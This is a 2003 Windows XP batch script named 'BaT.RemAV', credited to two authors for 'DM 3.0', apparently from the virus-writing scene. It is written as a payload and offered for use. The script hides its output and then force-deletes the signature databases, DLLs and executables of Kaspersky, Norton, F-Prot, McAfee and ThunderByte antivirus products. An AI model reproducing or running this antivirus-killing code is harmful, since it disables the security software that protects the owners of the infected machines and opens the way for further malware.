:: 
:: BaT.RemAV for winXP
::
:: Created for DM 3.0 by DvL and Ratty
:: 18.05.2003
::
:: Created by 2 good friends reunited
:: DvL      ( dvl2003ro@yahoo.co.uk )
:: Ratty    ( ratty2001ro@yahoo.com )
:: Contact us.
::
@echo off
ctty nul
@ver | find "XP"
if errorlevel 1 goto done
if not errorlevel 1 goto :XP
:XP
::
:: Kasperky AntiVirus Remover
::
IF EXIST C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\avp*.avc. (del /f /s C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\avp*.avc.) ELSE echo C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\avp*.avc. missing
IF EXIST C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\up*.avc. (del /f /s C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\up*.avc.) ELSE echo C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\up*.avc. missing
IF EXIST C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\daily.avc. (del /f /s C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\daily.avc.) ELSE echo C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\daily.avc. missing
::
:: Norton AntiVirus Remover
::
IF EXIST c:\progra~1\norton~1\dec2.dll. (del /f /s c:\progra~1\norton~1\dec2.dll.) ELSE echo c:\progra~1\norton~1\dec2.dll. missing
IF EXIST c:\progra~1\norton~1\navstart.dat. (del /f /s c:\progra~1\norton~1\navstart.dat.) ELSE echo c:\progra~1\norton~1\navstart.dat. missing
IF EXIST c:\progra~1\norton~1\navw32.exe. (del /f /s c:\progra~1\norton~1\navw32.exe.) ELSE echo c:\progra~1\norton~1\navw32.exe. missing
IF EXIST c:\progra~1\norton~1\sfstr32i.dll. (del /f /s c:\progra~1\norton~1\sfstr32i.dll.) ELSE echo c:\progra~1\norton~1\sfstr32i.dll. missing
IF EXIST c:\progra~1\norton~1\s32integ.dll. (del /f /s c:\progra~1\norton~1\s32integ.dll.) ELSE echo c:\progra~1\norton~1\s32integ.dll. missing
::
:: F-Prot95 AntiVirus Remover (i don't think someone will install win95 software on xp, but what the hell)
::
IF EXIST c:\progra~1\f-prot95\fpwm32.dll. (del /f /s c:\progra~1\f-prot95\fpwm32.dll.) ELSE echo c:\progra~1\f-prot95\fpwm32.dll. missing
::
:: McAfee AntiVirus Remover
::
IF EXIST c:\progra~1\mcafee\scan.dat. (del /f /s c:\progra~1\mcafee\scan.dat.) ELSE echo c:\progra~1\mcafee\scan.dat. missing
::
:: Some ThunderByte (i think) AntiVirus RemoverZ
::
IF EXIST c:\tbavw95\tbscan.sig. (del /f /s c:\tbavw95\tbscan.sig.) ELSE echo c:\tbavw95\tbscan.sig. missing
IF EXIST c:\tbav\tbav.dat. (del /f /s c:\tbav\tbav.dat.) ELSE echo c:\tbav\tbav.dat. missing
IF EXIST c:\progra~1\tbav\tbav.dat. (del /f /s c:\progra~1\tbav\tbav.dat.) ELSE echo c:\progra~1\tbav\tbav.dat. missing
ctty con
goto out
:out
exit
:done
cls